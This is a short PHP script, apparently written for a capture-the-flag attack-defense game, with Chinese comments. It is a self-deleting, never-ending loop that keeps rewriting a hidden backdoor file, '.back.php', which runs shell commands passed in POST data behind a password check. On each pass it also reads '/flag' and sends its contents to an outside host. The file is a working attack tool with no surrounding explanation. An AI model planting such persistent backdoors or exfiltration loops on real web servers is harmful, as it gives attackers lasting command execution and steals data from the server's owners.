<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '/var/www/html/.back.php';
$code = '<?php if(md5($_POST["pass"])==""){@system($_POST[a]);}?>';
while(1) {
    // 文件落地
    file_put_contents($file, $code);

    // 文件不落地
    $flag = file_get_contents("/flag");
    file_get_contents("http://flagserver/?$flag");
    usleep(5000);
}